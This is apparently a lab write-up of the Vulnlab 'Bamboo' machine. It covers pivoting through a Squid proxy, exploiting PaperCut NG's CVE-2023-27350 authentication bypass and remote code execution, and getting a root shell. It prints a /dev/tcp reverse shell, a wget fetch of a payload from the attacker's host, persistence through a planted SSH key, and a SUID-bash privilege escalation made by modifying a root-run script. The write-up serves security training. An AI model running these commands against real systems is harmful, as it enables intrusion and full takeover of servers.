---
icon: chopsticks
cover: ../../.gitbook/assets/zenitsu-agatsuma-5k-3840x2160-16938.jpg
coverY: 572.7793840351981
---

# VL-BAMBO

***

### Reconnaissance

#### Initial Port Scan

We start by scanning all ports on the target machine:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ Ports=$(sudo nmap -p- --min-rate 300 --max-rate 500 -Pn 10.10.98.223 --- BLAH BLAH 
```

#### Detailed Service Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ sudo nmap -Pn -sC -sV -p$Ports -oN Full_TCP_Scan 10.10.98.223
```

**Scan Results:**

```
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.98.223
Host is up (0.054s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
3128/tcp open  http-proxy  Squid http proxy 5.2
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Findings

* **Port 22 (SSH):** OpenSSH 8.9p1 - Standard SSH service
* **Port 3128 (HTTP Proxy):** Squid HTTP Proxy 5.2 - Our entry point for internal network access

<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

***

### Squid Proxy Enumeration

#### What is Squid Proxy?

Squid is a caching and forwarding HTTP web proxy with the following features:

* Speeds up web servers by caching repeated requests
* Caches web, DNS, and other network lookups
* Aids security by filtering traffic
* Supports HTTP, FTP, SSL, TLS, and HTTPS protocols

#### Configuring Proxychains

Edit the proxychains configuration file:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ sudo nano /etc/proxychains.conf
```

Add the following line at the end:

```
http 10.10.98.223 3128
```

#### Internal Port Discovery

We use a custom Squid scanner tool by XCT to discover internal ports:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ wget https://gist.githubusercontent.com/xct/597d48456214b15108b2817660fdee00/raw/squidscan.go
```

Edit the `squidscan.go` file and update the proxy IP:

```go
var proxy = "http://10.10.98.223:3128"
```

Build and run the scanner:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ go build squidscan.go

┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ ./squidscan
```

**Results:**

```
[+] Port 22 - OPEN
[+] Port 9173 - OPEN
[+] Port 9174 - OPEN
[+] Port 9191 - OPEN
[+] Port 9192 - OPEN
[+] Port 9195 - OPEN
[+] Port 36116 - OPEN
```

***

### Internal Service Discovery

#### Scanning Internal Ports

Using Nmap through proxychains to enumerate internal services:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ sudo proxychains -q nmap -Pn -sT -sC -sV -p22,9173,9174,9191,9192,9195,36116 --min-rate 300 --max-rate 500 127.0.0.1
```

**Scan Results:**

```
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.10s latency).

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
9173/tcp  open   http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
9174/tcp  open   ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Site doesn't have a title.
|_Requested resource was /admin/
| ssl-cert: Subject: organizationName=PaperCut Software International Pty Ltd.
9191/tcp  open   sun-as-jpda?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Location: http://127.0.0.1:9191/user
9192/tcp  open   ssl/unknown
| ssl-cert: Subject: commonName=bamboo
9195/tcp  open   ssl/unknown
| ssl-cert: Subject: commonName=bamboo
36116/tcp closed unknown
```

#### Key Discovery: PaperCut NG

The SSL certificate on port 9174 reveals **PaperCut Software International Pty Ltd**, indicating PaperCut NG is running on this machine.

#### Configuring Burp Suite

To access internal web services, configure Burp Suite with an upstream proxy:

<figure><img src="../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

**Steps:**

1. Open Burp Suite
2. Navigate to: `Proxy → Options → Network → Connections → Upstream Proxy Servers`
3. Add new upstream proxy:
   * **Destination Host:** `*`
   * **Proxy Host:** `10.10.98.223`
   * **Proxy Port:** `3128`

#### Configuring FoxyProxy

Configure FoxyProxy extension in Firefox:

* **Proxy Type:** HTTP
* **Proxy IP:** `127.0.0.1`
* **Port:** `8080` (Burp Suite default)

***

### PaperCut NG Exploitation

#### Accessing PaperCut NG

With Burp Suite and FoxyProxy configured, access the internal application:

```
http://127.0.0.1:9191
```

**Application Identified:** PaperCut NG version 22.0

<figure><img src="../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

#### What is PaperCut NG?

PaperCut NG is print management software that helps organizations:

* Track and manage printing activities
* Set print quotas
* Generate detailed reports
* Implement print policies to reduce waste

#### Vulnerability Research

Search for known exploits:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ searchsploit PaperCut NG
```

**Results:**

```
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
PaperCut NG/MG 22.0.4 - Authentication Bypass               | multiple/webapps/51580.py
PaperCut NG/MG 22.0.4 - Remote Code Execution               | multiple/webapps/51581.py
------------------------------------------------------------ ---------------------------------
```

**CVE-2023-27350:** Authentication Bypass vulnerability affecting PaperCut NG/MG versions 8.0 and later.

#### Testing Authentication Bypass

Copy the exploit:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ searchsploit -m multiple/webapps/51580.py

┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ mv 51580.py Authentication_Bypass.py
```

Run the exploit:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ proxychains python3 Authentication_Bypass.py
```

**Output:**

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Enter the ip address: 10.10.98.223
[proxychains] Strict chain ... 10.10.98.223:3128 ... 10.10.98.223:9191 ... OK

Version: 22.0.6
Vulnerable version

Step 1 visit this url first in your browser: 
http://10.10.98.223:9191/app?service=page/SetupCompleted

Step 2 visit this url in your browser to bypass the login page: 
http://10.10.98.223:9191/app?service=page/Dashboard
```

#### Bypassing Authentication

**Step 1:** Visit the setup completion page:

```
http://10.10.98.223:9191/app?service=page/SetupCompleted
```

**Step 2:** Access the dashboard without authentication:

```
http://10.10.98.223:9191/app?service=page/Dashboard
```

**Success!** We now have administrative access to PaperCut NG.

### Initial Access

#### Obtaining RCE Exploit

Download a working RCE exploit:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ git clone https://github.com/adhikara13/CVE-2023-27350

┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ cd CVE-2023-27350
```

#### Preparing Reverse Shell

Direct reverse shell commands didn't work, so we'll upload a shell script:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ nano shell.sh
```

**shell.sh content:**

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.78/4444 0>&1
```

Make it executable and start HTTP server:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ chmod +x shell.sh

┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ python3 -m http.server 8000
```

#### Setting Up Listener

Open a new terminal and start netcat:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ nc -lvnp 4444
```

**Output:**

```
listening on [any] 4444 ...
```

#### Executing the Exploit

Upload the reverse shell script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO/CVE-2023-27350]
└─$ python3 exploit.py -t 10.10.98.223 -p 9191 -c 'wget http://10.10.15.78:8000/shell.sh -O /tmp/shell.sh'
```

**Output:**

```
[+] Command executed successfully!
```

Make it executable:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO/CVE-2023-27350]
└─$ python3 exploit.py -t 10.10.98.223 -p 9191 -c 'chmod +x /tmp/shell.sh'
```

**Output:**

```
[+] Command executed successfully!
```

Execute the reverse shell:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO/CVE-2023-27350]
└─$ python3 exploit.py -t 10.10.98.223 -p 9191 -c 'bash /tmp/shell.sh'
```

**Output:**

```
[+] Command executed successfully!
```

#### Shell Received

Back on our netcat listener:

```
connect to [10.10.15.78] from (UNKNOWN) [10.10.98.223] 45678
bash: cannot set terminal process group (874): Inappropriate ioctl for device
bash: no job control in this shell
papercut@bamboo:~/server$
```

**Shell obtained as papercut user!**

#### Upgrading to Stable Shell

```bash
papercut@bamboo:~/server$ python3 -c 'import pty;pty.spawn("/bin/bash");'
papercut@bamboo:~/server$ ^Z
[1]+  Stopped                 nc -lvnp 4444
```

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ stty raw -echo; fg
```

```bash
papercut@bamboo:~/server$ export TERM=xterm-256color
papercut@bamboo:~/server$ id
uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
```

#### Establishing SSH Access

Generate SSH key pair:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ ssh-keygen -f papercut
```

**Output:**

```
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Your identification has been saved in papercut
Your public key has been saved in papercut.pub
```

Copy the public key:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ cat papercut.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGh9cliRgMOVm+/upPzk574r+Jx28Po7RjTWnOu4cr+S sn0x@kali
```

On the target machine:

```bash
papercut@bamboo:~$ mkdir -p ~/.ssh
papercut@bamboo:~$ cd ~/.ssh
papercut@bamboo:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGh9cliRgMOVm+/upPzk574r+Jx28Po7RjTWnOu4cr+S sn0x@kali" > authorized_keys
papercut@bamboo:~/.ssh$ chmod 600 authorized_keys
```

SSH into the target:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ ssh -i papercut papercut@10.10.98.223
```

**Output:**

```
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64)
Last login: Sat Feb  9 10:23:45 2026 from 10.10.15.78
papercut@bamboo:~$
```

***

### Privilege Escalation

#### Enumeration with LinPEAS

Download LinPEAS:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ python3 -m http.server 8000
```

On the target:

```bash
papercut@bamboo:~$ wget http://10.10.15.78:8000/linpeas.sh
papercut@bamboo:~$ chmod +x linpeas.sh
papercut@bamboo:~$ ./linpeas.sh
```

#### Key Finding: Writable Directory

LinPEAS reveals an interesting finding:

```
[+] Interesting writable files owned by current user
/home/papercut/server/bin/linux-x64/
```

**All files in this directory are writable by the papercut user!**

#### Process Monitoring with pspy64

Download and run pspy64:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

On the target:

```bash
papercut@bamboo:~$ wget http://10.10.15.78:8000/pspy64
papercut@bamboo:~$ chmod +x pspy64
papercut@bamboo:~$ ./pspy64
```

#### Triggering Process Execution

While pspy64 is running, interact with the PaperCut NG web interface:

1. Navigate to: `http://10.10.98.223:9191/app?service=page/PrintDeploy`
2. Click: `Start Importing Mobility Print printers`
3. Click: `Import Mobility Print queues`
4. Click: `Refresh servers`

**pspy64 output:**

```
CMD: UID=0    PID=12345  | /bin/bash /home/papercut/server/bin/linux-x64/server-command
```

🔥 **Critical Finding:** The `server-command` script is executed with **root privileges (UID=0)**!

#### Analyzing server-command Script

```bash
papercut@bamboo:~$ cat /home/papercut/server/bin/linux-x64/server-command
```

**Script content:**

```bash
#!/bin/sh
#
# (c) Copyright 1999-2013 PaperCut Software International Pty Ltd
#
# A wrapper for server-command
#

. `dirname $0`/.common

export CLASSPATH

${JRE_HOME}/bin/java \
 -Djava.io.tmpdir=${TMP_DIR} \
 -Dserver.home=${SERVER_HOME} \
 -Djava.awt.headless=true \
 -Djava.locale.providers=COMPAT,SPI \
 -Dlog4j.configurationFile=file:${SERVER_HOME}/lib/log4j2-command.properties \
 -Xverify:none \
biz.papercut.pcng.server.ServerCommand \
"$@"
```

#### Testing Command Injection

Start HTTP server for testing:

```bash
┌──(sn0x㉿sn0x)-[~/Vulnlab/BAMBOO]
└─$ python3 -m http.server 8080
```

Add test command to the script:

```bash
papercut@bamboo:~$ echo 'curl http://10.10.15.78:8080/test.txt' >> /home/papercut/server/bin/linux-x64/server-command
```

Trigger execution through the web interface again (Refresh servers button).

**HTTP server output:**

```
10.10.98.223 - - [09/Feb/2026 14:32:18] "GET /test.txt HTTP/1.1" 404 -
```

**Command injection successful! Commands execute as root!**

#### Understanding SUID Privilege Escalation

**What is SUID?**

The SUID (Set User ID) bit is a special file permission that allows users to execute a file with the permissions of the file owner, not their own permissions.

**How it works:**

1. Copy `/bin/bash` to a temporary location
2. Set the SUID bit with `chmod +s`
3. Execute the SUID bash with `-p` flag to preserve root privileges

#### Creating SUID Bash Binary

Edit the server-command script:

```bash
papercut@bamboo:~$ nano /home/papercut/server/bin/linux-x64/server-command
```

Replace the curl command with:

```bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

Trigger execution through web interface (Print Deploy → Refresh servers).

#### Verifying SUID Binary

```bash
papercut@bamboo:~$ ls -la /tmp/bash
-rwsr-sr-x 1 root root 1396520 Feb  9 14:45 /tmp/bash
```

**SUID bit is set!** (Notice the `s` in permissions)

***

#### Obtaining Root Shell

Execute the SUID bash binary:

```bash
papercut@bamboo:~$ /tmp/bash -p
```

**Output:**

```bash
bash-5.1# id
uid=1001(papercut) gid=1001(papercut) euid=0(root) egid=0(root) groups=0(root),1001(papercut)

bash-5.1# whoami
root
```

***

### References

* [CVE-2023-27350 Details](https://nvd.nist.gov/vuln/detail/CVE-2023-27350)
* [PaperCut NG Documentation](https://www.papercut.com/)
* [Squid Proxy Documentation](http://www.squid-cache.org/)
* [XCT Squid Scanner](https://gist.github.com/xct/597d48456214b15108b2817660fdee00)
* [CVE-2023-27350 Exploit](https://github.com/adhikara13/CVE-2023-27350)
